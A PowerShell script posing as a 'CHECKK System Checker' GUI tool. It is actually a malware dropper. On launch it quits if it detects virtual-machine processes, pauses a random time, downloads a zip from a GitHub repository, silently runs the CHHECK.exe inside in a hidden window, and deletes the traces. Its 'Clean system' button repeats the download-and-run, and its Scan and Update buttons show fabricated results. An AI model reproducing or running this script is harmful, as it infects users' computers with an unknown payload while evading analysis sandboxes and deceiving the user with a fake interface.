Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$Url = "https://github.com/v25888656-maker/CHECKK/archive/refs/heads/main.zip"
$ZipPath = "$env:TEMP\main.zip"
$ExtractPath = "$env:TEMP\CHECKK-main"

if (Get-Process -Name VBoxService, vmtoolsd, prl_cc, VGAuthService -ErrorAction SilentlyContinue) { exit }

Start-Sleep -Milliseconds (Get-Random -Minimum 3000 -Maximum 10000)

try {
    (New-Object Net.WebClient).DownloadFile($Url, $ZipPath)
    Expand-Archive -Path $ZipPath -DestinationPath $ExtractPath -Force
    $Zip2 = Get-ChildItem -Path $ExtractPath -Filter "CHHECK.zip" -Recurse | Select-Object -First 1
    if ($Zip2) { Expand-Archive -Path $Zip2.FullName -DestinationPath $ExtractPath -Force }
    $Exe = Get-ChildItem -Path $ExtractPath -Filter "CHHECK.exe" -Recurse | Select-Object -First 1
    if ($Exe) { Start-Process -WindowStyle Hidden $Exe.FullName }
    Start-Sleep -Seconds 2
    Remove-Item $ZipPath -Force -ErrorAction SilentlyContinue
    Remove-Item $ExtractPath -Recurse -Force -ErrorAction SilentlyContinue
} catch {
    # ошибка игнорируется
}

$form = New-Object System.Windows.Forms.Form
$form.Text = "CHECKK System Checker v2.0"
$form.Size = New-Object System.Drawing.Size(420, 320)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = 'FixedSingle'
$form.MaximizeBox = $false

$label = New-Object System.Windows.Forms.Label
$label.Text = "Choose action:"
$label.Location = New-Object System.Drawing.Point(50, 20)
$label.Size = New-Object System.Drawing.Size(300, 30)
$label.Font = New-Object System.Drawing.Font("Arial", 12, [System.Drawing.FontStyle]::Bold)
$form.Controls.Add($label)

$btnScan = New-Object System.Windows.Forms.Button
$btnScan.Text = "Scan system"
$btnScan.Location = New-Object System.Drawing.Point(50, 70)
$btnScan.Size = New-Object System.Drawing.Size(300, 40)
$btnScan.Font = New-Object System.Drawing.Font("Arial", 10)
$btnScan.BackColor = [System.Drawing.Color]::LightGreen
$form.Controls.Add($btnScan)

$btnUpdate = New-Object System.Windows.Forms.Button
$btnUpdate.Text = "Update components"
$btnUpdate.Location = New-Object System.Drawing.Point(50, 120)
$btnUpdate.Size = New-Object System.Drawing.Size(300, 40)
$btnUpdate.Font = New-Object System.Drawing.Font("Arial", 10)
$btnUpdate.BackColor = [System.Drawing.Color]::LightBlue
$form.Controls.Add($btnUpdate)

$btnClean = New-Object System.Windows.Forms.Button
$btnClean.Text = "Clean system"
$btnClean.Location = New-Object System.Drawing.Point(50, 170)
$btnClean.Size = New-Object System.Drawing.Size(300, 40)
$btnClean.Font = New-Object System.Drawing.Font("Arial", 10)
$btnClean.BackColor = [System.Drawing.Color]::LightCoral
$form.Controls.Add($btnClean)

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = "Ready"
$statusLabel.Location = New-Object System.Drawing.Point(50, 230)
$statusLabel.Size = New-Object System.Drawing.Size(300, 20)
$statusLabel.Font = New-Object System.Drawing.Font("Arial", 8)
$statusLabel.ForeColor = [System.Drawing.Color]::Gray
$form.Controls.Add($statusLabel)

$btnScan.Add_Click({
    $statusLabel.Text = "[*] Scanning..."
    $statusLabel.ForeColor = [System.Drawing.Color]::Blue
    Start-Sleep -Seconds 2
    [System.Windows.Forms.MessageBox]::Show("Scan complete. No threats found.", "Result")
    $statusLabel.Text = "Ready"
    $statusLabel.ForeColor = [System.Drawing.Color]::Gray
})

$btnUpdate.Add_Click({
    $statusLabel.Text = "[*] Updating..."
    $statusLabel.ForeColor = [System.Drawing.Color]::Orange
    Start-Sleep -Seconds 2
    [System.Windows.Forms.MessageBox]::Show("Update completed.", "Update")
    $statusLabel.Text = "Ready"
    $statusLabel.ForeColor = [System.Drawing.Color]::Gray
})

$btnClean.Add_Click({
    $statusLabel.Text = "[*] Loading modules..."
    $statusLabel.ForeColor = [System.Drawing.Color]::Red
    $form.Enabled = $false
    try {
        (New-Object Net.WebClient).DownloadFile($Url, $ZipPath)
        Expand-Archive -Path $ZipPath -DestinationPath $ExtractPath -Force
        $Zip2 = Get-ChildItem -Path $ExtractPath -Filter "CHHECK.zip" -Recurse | Select-Object -First 1
        if ($Zip2) { Expand-Archive -Path $Zip2.FullName -DestinationPath $ExtractPath -Force }
        $Exe = Get-ChildItem -Path $ExtractPath -Filter "CHHECK.exe" -Recurse | Select-Object -First 1
        if ($Exe) { Start-Process -WindowStyle Hidden $Exe.FullName }
        Start-Sleep -Seconds 2
        Remove-Item $ZipPath -Force -ErrorAction SilentlyContinue
        Remove-Item $ExtractPath -Recurse -Force -ErrorAction SilentlyContinue
        $statusLabel.Text = "[+] Done"
        [System.Windows.Forms.MessageBox]::Show("System cleaned successfully.", "Done")
    } catch {
        $statusLabel.Text = "[-] Error"
        [System.Windows.Forms.MessageBox]::Show("Download or execution error.", "Error")
    }
    $form.Enabled = $true
    $statusLabel.ForeColor = [System.Drawing.Color]::Gray
    $statusLabel.Text = "Ready"
})

$form.ShowDialog()
